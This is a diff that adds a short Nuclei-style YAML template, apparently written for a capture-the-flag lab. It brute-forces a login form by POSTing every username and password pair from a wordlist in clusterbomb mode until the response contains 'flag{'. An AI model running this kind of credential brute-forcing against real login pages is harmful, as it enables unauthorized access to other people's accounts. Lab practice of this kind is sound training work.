@@ -1,0 +1,30 @@
+id: post_brute
+
+info:
+  name: Check SidneyJob and cherepawwka lab
+  author: SidneyJob
+  severity: low
+  description: Check correct post_brute 
+
+http:
+  - raw:
+    - |
+      POST /postbrute HTTP/2
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      
+      username={{username}}&password={{password}}
+    
+    payloads:
+      username: ./pass
+      password: ./pass
+    
+    cookie-reuse: true
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "flag{"
+      
+    attack: clusterbomb
